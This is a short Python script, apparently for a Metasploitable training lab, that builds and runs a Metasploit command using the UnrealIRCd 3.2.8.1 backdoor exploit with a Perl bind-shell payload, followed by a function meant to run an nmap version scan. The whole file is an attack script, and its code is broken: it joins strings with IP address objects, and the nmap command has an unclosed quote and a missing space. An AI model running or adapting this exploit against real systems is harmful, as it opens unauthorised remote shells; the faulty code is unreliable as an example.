import os
import ipaddress

def unreal_backdoor():
    h = input('Please enter the address of metasploitable: ')
    y = ipaddress.ip_address(h)
    print("Starting exploit against", y)
    command = "msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor;set RHOSTS " + y + ";set payload cmd/unix/bind_perl;exploit'"
    os.system(command)

unreal_backdoor()

def nmap():
    h = input('Please enter the address of metasploitable: ')
    y = ipaddress.ip_address(h)
    print("Starting exploit against", y)
    command = "msfconsole -x 'nmap -v -sV" + y
    os.system(command)

nmap()
